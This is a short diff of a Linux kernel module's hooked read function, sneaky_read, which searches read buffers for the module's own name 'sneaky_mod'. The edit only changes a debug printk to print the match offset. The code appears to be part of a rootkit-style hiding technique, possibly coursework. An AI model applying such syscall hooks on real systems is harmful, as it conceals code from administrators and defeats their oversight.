@@ -98,7 +98,7 @@ asmlinkage int sneaky_read(struct pt_regs *regs) {
   const char *name = "sneaky_mod ";
   char *pos = strstr(buf, name);
   if(pos) {
-    printk(KERN_INFO "%s\n", buf);
+    printk(KERN_INFO "%td\n", pos-buf);
   }
 
   return ret;
